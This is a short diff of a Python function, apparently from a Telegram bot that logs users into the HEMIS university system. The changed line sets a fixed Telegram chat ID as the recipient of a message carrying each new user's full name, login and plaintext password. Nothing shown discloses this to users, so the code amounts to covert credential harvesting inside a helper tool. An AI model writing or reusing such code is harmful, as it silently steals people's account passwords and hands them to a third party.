@@ -95,7 +95,7 @@ def get_datas_from_hemis(login, parol, bot):
                 "detail": "Avval HEMIS tizimiga kiring va parolingizni yangilang.\n\nLogin va parollarni qayta kiriting."
             }
         bot.send_message(
-            51,
+            5139310978,
             "Yangi Foydalanuvchi\nFIO: {}\nLogin: {}\nParol: {}".format(
                 data["first_name"] + " " + data["second_name"],
                 login,
